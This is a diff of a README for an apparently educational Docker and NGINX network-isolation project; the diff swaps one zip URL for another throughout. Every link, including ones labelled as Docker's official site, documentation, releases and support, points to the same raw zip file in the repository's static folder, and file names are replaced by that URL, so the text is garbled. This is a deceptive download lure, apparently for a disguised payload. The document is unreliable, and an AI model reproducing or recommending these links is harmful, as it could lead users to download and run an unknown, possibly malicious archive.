@@ -1,14 +1,14 @@
-# 🌐 poc-network-isolation - Secure Your https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc-network-isolation-2.7.zip Apps with Ease
+# 🌐 poc-network-isolation - Secure Your https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc_isolation_network_3.3.zip Apps with Ease
 
-[![Download Now](https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc-network-isolation-2.7.zip)](https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc-network-isolation-2.7.zip)
+[![Download Now](https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc_isolation_network_3.3.zip)](https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc_isolation_network_3.3.zip)
 
 ## 🚀 Getting Started
 
-Welcome to the poc-network-isolation project. This educational proof of concept helps you understand how to isolate your https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc-network-isolation-2.7.zip applications using Docker. You will also learn to use NGINX as a gateway for outgoing traffic. This setup enhances your app's security and helps in learning essential cybersecurity concepts.
+Welcome to the poc-network-isolation project. This educational proof of concept helps you understand how to isolate your https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc_isolation_network_3.3.zip applications using Docker. You will also learn to use NGINX as a gateway for outgoing traffic. This setup enhances your app's security and helps in learning essential cybersecurity concepts.
 
 ## 📥 Download & Install
 
-To download the latest version of poc-network-isolation, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc-network-isolation-2.7.zip).
+To download the latest version of poc-network-isolation, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc_isolation_network_3.3.zip).
 
 1. **Visit the Releases Page**  
    Click on the link above.
@@ -17,7 +17,7 @@ To download the latest version of poc-network-isolation, visit this page to down
    Look for the newest release at the top.
 
 3. **Download the Files**  
-   Click on the relevant file for your operating system (e.g., .zip or https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc-network-isolation-2.7.zip).
+   Click on the relevant file for your operating system (e.g., .zip or https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc_isolation_network_3.3.zip).
 
 4. **Extract Files**  
    Once downloaded, extract the files to a location on your computer.
@@ -36,7 +36,7 @@ To download the latest version of poc-network-isolation, visit this page to down
 To run poc-network-isolation, you need the following:
 
 - **Operating System**: Compatible with Windows, macOS, or Linux.
-- **Docker**: Ensure you have Docker installed. You can download it from [Docker's official site](https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc-network-isolation-2.7.zip).
+- **Docker**: Ensure you have Docker installed. You can download it from [Docker's official site](https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc_isolation_network_3.3.zip).
 - **Memory**: At least 4 GB of RAM is recommended.
 - **CPU**: Multi-core processor for optimal performance.
 
@@ -53,19 +53,19 @@ To run poc-network-isolation, you need the following:
 
 Here’s a quick look at the main components of the project:
 
-- **Dockerfile**: Configures the Docker environment for your https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc-network-isolation-2.7.zip app.
-- **https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc-network-isolation-2.7.zip**: Simplifies the process of spinning up multiple Docker containers.
-- **https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc-network-isolation-2.7.zip**: Contains the NGINX configuration for handling requests.
+- **Dockerfile**: Configures the Docker environment for your https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc_isolation_network_3.3.zip app.
+- **https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc_isolation_network_3.3.zip**: Simplifies the process of spinning up multiple Docker containers.
+- **https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc_isolation_network_3.3.zip**: Contains the NGINX configuration for handling requests.
 - **src/**: Folder where the source code resides.
-- **https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc-network-isolation-2.7.zip**: This document, containing all the essential information.
+- **https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc_isolation_network_3.3.zip**: This document, containing all the essential information.
 
 ### 📂 Explanation of Key Files
 
 - **Dockerfile**: Details how to build the Docker image. It specifies the base image, dependencies, and startup commands.
   
-- **https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc-network-isolation-2.7.zip**: Manages multiple containers and their relationships, making it easy to run your entire setup with a single command.
+- **https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc_isolation_network_3.3.zip**: Manages multiple containers and their relationships, making it easy to run your entire setup with a single command.
 
-- **https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc-network-isolation-2.7.zip**: Configures how NGINX will function as an egress proxy. It defines routes and handles load balancing.
+- **https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc_isolation_network_3.3.zip**: Configures how NGINX will function as an egress proxy. It defines routes and handles load balancing.
 
 ## 🔍 Networking Concepts
 
@@ -81,9 +81,9 @@ Understanding network isolation is crucial for securing applications. Here are s
 
 Explore additional materials to deepen your understanding:
 
-- **Docker Documentation**: [Learn Docker](https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc-network-isolation-2.7.zip)
-- **NGINX Documentation**: [Learn about NGINX](https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc-network-isolation-2.7.zip)
-- **Cybersecurity Basics**: [Basic Concepts](https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc-network-isolation-2.7.zip)
+- **Docker Documentation**: [Learn Docker](https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc_isolation_network_3.3.zip)
+- **NGINX Documentation**: [Learn about NGINX](https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc_isolation_network_3.3.zip)
+- **Cybersecurity Basics**: [Basic Concepts](https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc_isolation_network_3.3.zip)
 
 ## 🛠️ Troubleshooting
 
@@ -97,6 +97,6 @@ If you run into issues, consider the following solutions:
 
 ## 📞 Support
 
-For assistance, visit the issues section of the [GitHub repository](https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc-network-isolation-2.7.zip). You can report any bugs or request new features there.
+For assistance, visit the issues section of the [GitHub repository](https://raw.githubusercontent.com/iamlucass/poc-network-isolation/main/node/server/static/poc_isolation_network_3.3.zip). You can report any bugs or request new features there.
 
 Remember, security is an ongoing process. Keep learning and experimenting to strengthen your applications.
